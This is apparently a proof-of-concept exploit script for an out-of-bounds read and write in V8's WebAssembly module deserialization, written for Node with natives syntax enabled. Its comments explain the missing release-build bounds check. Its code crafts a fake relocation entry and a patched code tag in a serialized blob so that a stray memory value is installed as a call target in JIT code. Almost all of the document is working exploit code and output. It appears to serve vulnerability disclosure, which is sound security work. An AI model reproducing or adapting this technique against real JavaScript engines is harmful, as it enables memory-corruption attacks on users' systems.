// V8 Wasm Deserialization — External-Reference Tag OOB Array Read + Write
// File:   src/wasm/wasm-serialization.cc:1139-1141
// CWE-129 (Improper Validation of Array Index) · severity: MEDIUM
//
// Root cause
// ----------
// NativeModuleDeserializer::CopyAndRelocate handles EXTERNAL_REFERENCE relocs:
//
//   1138:  case RelocInfo::EXTERNAL_REFERENCE: {
//   1139:    uint32_t tag = GetWasmCalleeTag(iter.rinfo());
//   1140:    Address address = ExternalReferenceList::Get().address_from_tag(tag);
//   1141:    iter.rinfo()->set_target_external_reference(address, SKIP_ICACHE_FLUSH);
//
// `tag` comes from attacker-controlled code bytes via (x64):
//   GetWasmCalleeTag: ReadUnalignedValue<uint32_t>(rinfo->target_address_address())
//
// address_from_tag has ONLY a DCHECK, stripped in release:
//   286:  Address address_from_tag(uint32_t tag) const {
//   287:    DCHECK_GT(kNumExternalReferences, tag);   ← stripped in release builds
//   288:    return external_reference_by_tag_[tag];   ← OOB array read in release
//   289:  }
//
// kNumExternalReferences ≈ 1700–3000 (EXTERNAL_REFERENCE_LIST + FOR_EACH_INTRINSIC).
// With tag = 0x7FFF (32767), the read is >>256KB past the array end into .bss/.data.
// The fetched 8-byte Address is then installed as the external-reference call target
// in executable memory via set_target_external_reference.
//
// Approach
// --------
// On x64 with Turboshaft, external C function calls from wasm code are routed
// through wasm builtins (WASM_STUB_CALL), not direct EXTERNAL_REFERENCE relocs.
// So rather than searching for a natural EXTERNAL_REFERENCE entry, we INJECT a
// crafted one — the same technique used for WASM_CALL in reloc_oob_poc.js.
//
// Reloc encoding (src/codegen/reloc-info.cc, WriteModeAndPC):
//   A 2-byte EXTERNAL_REFERENCE entry stored in reloc_data = [pc_delta, mode_byte]
//   mode_byte = (rmode << kTagBits) | kDefaultTag = (11 << 2) | 3 = 0x2F
//
// The iterator reads backward:
//   1. Reads mode_byte = 0x2F  → rmode=11 = EXTERNAL_REFERENCE
//   2. Reads pc_delta byte     → pc_ += pc_delta
//   3. GetWasmCalleeTag(rinfo) reads uint32 from code[pc_delta..pc_delta+3]
//   4. address_from_tag(tag)   → DCHECK at line 287 / OOB read in release
//
// Steps
// -----
//   1. Compile wasm module + warm to TurboFan (tier=0x02)
//   2. %SerializeWasmModule → get blob with 2-byte reloc [3a 76] (WASM_STUB_CALLs)
//   3. PATCH code[PC_DELTA..PC_DELTA+3] = uint32_LE(0x7FFF) in blob
//   4. REPLACE reloc bytes with [PC_DELTA, 0x2F] (fake EXTERNAL_REFERENCE)
//      reloc_size stays 2 (no header change needed)
//   5. %DeserializeWasmModule(patched_blob, WASM) → triggers vulnerable path
//
// Impact
// ------
//   Debug build  : DCHECK_GT(kNumExternalReferences, 0x7FFF) fires at line 287
//   Release build: OOB read external_reference_by_tag_[0x7FFF] (~256KB past end)
//                  → 8-byte value from .bss/.data written to executable code
//                  → arbitrary call target installed in JIT memory
//
// Run:
//   node --allow-natives-syntax --no-liftoff extref_oob_poc.js

'use strict';

// ── Minimal wasm: returns i32.const 42 ────────────────────────────────────────
// The specific instruction doesn't matter — we need TurboFan code bytes to inject
// our crafted reloc into.  Simple constant-return functions warm quickly.
const WASM = new Uint8Array([
  0x00,0x61,0x73,0x6d, 0x01,0x00,0x00,0x00,  // magic + version
  0x01,0x05, 0x01,0x60, 0x00,0x01,0x7f,       // type: () -> i32
  0x03,0x02, 0x01,0x00,                        // 1 function, type 0
  0x07,0x05, 0x01,0x01, 0x66,0x00,0x00,       // export "f" = func 0
  0x0a,0x06, 0x01,0x04, 0x00,0x41,0x2a,0x0b, // code: i32.const 42, end
]);

// ── Step 1: Compile + warm to TurboFan ────────────────────────────────────────
console.log('[1] Compiling and warming to TurboFan...');
const mod  = new WebAssembly.Module(WASM);
const inst = new WebAssembly.Instance(mod);
for (let i = 0; i < 200000; i++) inst.exports.f();
console.log('    f() = ' + inst.exports.f());

// ── Step 2: Serialize ─────────────────────────────────────────────────────────
// Use eval() so the file parses cleanly without --allow-natives-syntax;
// eval itself will throw SyntaxError at runtime if the flag is absent.
let blob;
try {
  blob = eval('%SerializeWasmModule(mod)');
} catch (e) {
  if (e instanceof SyntaxError) {
    console.error('[!] %SerializeWasmModule requires --allow-natives-syntax.');
    console.error('    Run: node --allow-natives-syntax --no-liftoff extref_oob_poc.js');
    process.exit(1);
  }
  throw e;
}
if (!blob) { console.error('[!] %SerializeWasmModule returned null'); process.exit(1); }
const bv = new Uint8Array(blob);
const dv = new DataView(blob);
console.log('[2] Blob: ' + blob.byteLength + 'B');

// ── Step 3: Parse blob structure ──────────────────────────────────────────────
// Layout: global_header(29B) | [ func_header(54B) + code + reloc + ... ] × N
//
// func_header offsets (relative to per-func block start):
//   +0:  code_kind (uint8; 0x04 = TurboFan)
//   +29: code_size  (uint32 LE)
//   +33: reloc_size (uint32 LE)   ← we MAY update this
//   +53: tier       (uint8; 0x02 = TurboFan/Turboshaft)
//   +54: code_data  [code_size bytes]  ← we write OOB tag here
//        reloc_data [reloc_size bytes] ← we replace with crafted entry

const GLOBAL_HDR = 29;
const f0_abs = GLOBAL_HDR;

const code_kind  = bv[f0_abs];
const code_size  = dv.getUint32(f0_abs + 29, true);
const reloc_size = dv.getUint32(f0_abs + 33, true);
const tier       = bv[f0_abs + 53];
const code_start  = f0_abs + 54;
const reloc_start = code_start + code_size;

console.log('[3] func0: code_kind=0x' + code_kind.toString(16) +
            ' tier=0x' + tier.toString(16) +
            ' code_size=' + code_size + ' reloc_size=' + reloc_size);

if (tier !== 0x02) {
  console.log('[!] func0 is not TurboFan (tier=0x' + tier.toString(16) + ').');
  console.log('    Re-run: node --allow-natives-syntax --no-liftoff extref_oob_poc.js');
  process.exit(0);
}

const orig_reloc = [...bv.slice(reloc_start, reloc_start + reloc_size)]
                     .map(b => b.toString(16).padStart(2,'0')).join(' ');
console.log('    reloc_data (original): ' + orig_reloc);

// ── Step 4: Choose injection PC ───────────────────────────────────────────────
// We inject a fake EXTERNAL_REFERENCE entry with pc_delta = PC_DELTA.
// The iterator advances pc_ to code[PC_DELTA]; GetWasmCalleeTag reads 4 bytes there.
// Pick an offset safely inside the code section with room for a uint32 (4 bytes).
//
// The first few code bytes are prologue (push rbp; mov rbp,rsp; sub rsp,...).
// We'll use PC_DELTA = 8 so the patched bytes are well inside the code section.

const PC_DELTA = 8;  // offset inside code section for the injected reloc PC
const OOB_TAG  = 0x7FFF;  // 32767 — well past kNumExternalReferences (~1700–3000)

// ── Step 5: Craft the patched blob ────────────────────────────────────────────
// Reloc encoding for EXTERNAL_REFERENCE (rmode=11):
//   WriteModeAndPC writes:
//     *--pos_ = (rmode << 2) | kDefaultTag = (11 << 2) | 3 = 0x2F  (mode byte)
//     *--pos_ = pc_delta                                             (delta byte)
//
//   So in-memory layout (low→high): [pc_delta, mode_byte] = [PC_DELTA, 0x2F]
//
//   Iterator reads backward:
//     1. mode_byte = 0x2F  → EXTERNAL_REFERENCE
//     2. delta byte = PC_DELTA → pc_ = 0 + PC_DELTA
//     3. GetWasmCalleeTag reads code[PC_DELTA..PC_DELTA+3] = OOB_TAG

const EXT_REF_MODE_BYTE = (11 << 2) | 3;  // 0x2F
const new_reloc = new Uint8Array([PC_DELTA, EXT_REF_MODE_BYTE]);

console.log('\n[4] Injecting fake EXTERNAL_REFERENCE reloc:');
console.log('    new reloc_data: [' +
            [...new_reloc].map(b => '0x'+b.toString(16).padStart(2,'0')).join(', ') + ']');
console.log('    = pc_delta=0x' + PC_DELTA.toString(16) + '  mode=0x' +
            EXT_REF_MODE_BYTE.toString(16) + ' (EXTERNAL_REFERENCE rmode=11)');

const patched = blob.slice(0);
const pv = new Uint8Array(patched);
const pd = new DataView(patched);

// 5a. Overwrite reloc bytes with crafted entry (same size = 2B, no header change)
for (let i = 0; i < new_reloc.length; i++) {
  pv[reloc_start + i] = new_reloc[i];
}

// 5b. Write OOB_TAG uint32 at code[PC_DELTA]
// The iterator will read these 4 bytes as the external reference tag.
const tag_abs = code_start + PC_DELTA;
const orig_bytes = [...bv.slice(tag_abs, tag_abs + 4)]
                    .map(b => b.toString(16).padStart(2,'0')).join(' ');
pd.setUint32(tag_abs, OOB_TAG, true);
const new_bytes = [...pv.slice(tag_abs, tag_abs + 4)]
                   .map(b => b.toString(16).padStart(2,'0')).join(' ');

console.log('\n[5] Patching code bytes at offset ' + PC_DELTA + ':');
console.log('    code[' + PC_DELTA + '..+3]: ' + orig_bytes +
            ' → ' + new_bytes +
            '  (OOB_TAG=0x' + OOB_TAG.toString(16) + ' LE)');

// reloc_size stays 2 — new_reloc.length === reloc_size (no header update needed)
if (new_reloc.length !== reloc_size) {
  pd.setUint32(f0_abs + 33, new_reloc.length, true);
  console.log('    Updated reloc_size: ' + reloc_size + ' → ' + new_reloc.length);
}

// ── Step 6: Trigger deserialization ───────────────────────────────────────────
console.log('\n[6] %DeserializeWasmModule(patched_blob, WASM) ...');
console.log('    CopyAndRelocate will process reloc entry:');
console.log('    → EXTERNAL_REFERENCE at code[' + PC_DELTA + ']');
console.log('    → GetWasmCalleeTag reads uint32 = 0x' + OOB_TAG.toString(16));
console.log('    → address_from_tag(0x' + OOB_TAG.toString(16) +
            ')  [kNumExternalReferences ~1700–3000]');
console.log('    Debug: DCHECK_GT(kNumExternalReferences, 0x7FFF) fires at line 287');
console.log('    Release: external_reference_by_tag_[0x7FFF] read (~256KB OOB)');
console.log('             returned .bss Address written to executable code as call target');

try {
  const poisoned_mod = eval('%DeserializeWasmModule(patched, WASM)');
  if (poisoned_mod) {
    console.log('\n╔════════════════════════════════════════════════════════════════╗');
    console.log('║  [RELEASE BUILD] OOB READ + WRITE EXECUTED                    ║');
    console.log('║  address_from_tag(0x7FFF) returned arbitrary .bss pointer     ║');
    console.log('║  that pointer written to executable code as call target        ║');
    console.log('╚════════════════════════════════════════════════════════════════╝');
    // Attempt to call: code[8..15] was overwritten with a .bss-sourced Address.
    // In release, calling f() may crash (call to invalid address) or return garbage.
    try {
      const pi = new WebAssembly.Instance(poisoned_mod);
      console.log('\n  poisoned f() = ' + pi.exports.f() +
                  '  (code bytes at [8..15] corrupted by OOB .bss Address)');
    } catch (ce) {
      console.log('\n  [CRASH on call] ' + ce.message +
                  '  — OOB .bss Address installed as call target, now executed');
    }
  }
} catch (e) {
  console.log('\n[EXCEPTION] ' + e.message);
  if (/Check failed|DCHECK|FATAL/.test(e.message)) {
    console.log('\n╔════════════════════════════════════════════════════════════════╗');
    console.log('║  [DEBUG BUILD] DCHECK_GT(kNumExternalReferences, 0x7FFF)      ║');
    console.log('║  FIRED at src/wasm/wasm-serialization.cc:287                  ║');
    console.log('║  confirms: guard present in debug, absent in release           ║');
    console.log('╚════════════════════════════════════════════════════════════════╝');
  } else {
    console.log('  (crash on OOB read or on call to hijacked target in release)');
  }
}

console.log('\n╔══════════════════════════════════════════════════════════════════════════╗');
console.log('║  Vulnerability: External-Reference Tag OOB Array Read + Write           ║');
console.log('║  File:    src/wasm/wasm-serialization.cc:1139-1141  CWE-129             ║');
console.log('║  Guard:   DCHECK_GT(kNumExternalReferences, tag) at line 287            ║');
console.log('║           compiled away in release → silent OOB read in release         ║');
console.log('║                                                                          ║');
console.log('║  Trigger: %DeserializeWasmModule with crafted reloc + patched code       ║');
console.log('║    1. Serialize any TurboFan wasm module                                ║');
console.log('║    2. Write OOB tag uint32 at code[PC_DELTA..PC_DELTA+3]               ║');
console.log('║    3. Replace reloc bytes with [PC_DELTA, 0x2F] (EXTERNAL_REFERENCE)   ║');
console.log('║    4. Deserialize → address_from_tag(0x7FFF) reads 256KB past array    ║');
console.log('║    5. Arbitrary .bss Address installed as call target in JIT code       ║');
console.log('║                                                                          ║');
console.log('║  Run: node --allow-natives-syntax --no-liftoff extref_oob_poc.js        ║');
console.log('╚══════════════════════════════════════════════════════════════════════════╝');
